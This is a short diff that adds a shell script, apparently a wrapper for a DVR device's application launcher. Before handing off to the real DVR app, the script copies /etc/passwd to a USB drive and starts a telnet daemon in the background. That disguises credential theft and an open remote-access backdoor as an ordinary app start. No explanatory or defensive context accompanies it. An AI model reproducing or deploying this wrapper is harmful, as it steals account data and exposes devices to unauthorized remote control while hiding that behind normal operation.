@@ -1,0 +1,4 @@
+#!/bin/sh
+cp /etc/passwd /media/usb1/extracted_passwd_file
+/usr/sbin/telnetd &
+exec /media/usb1/dvr_app_chain "\$@"
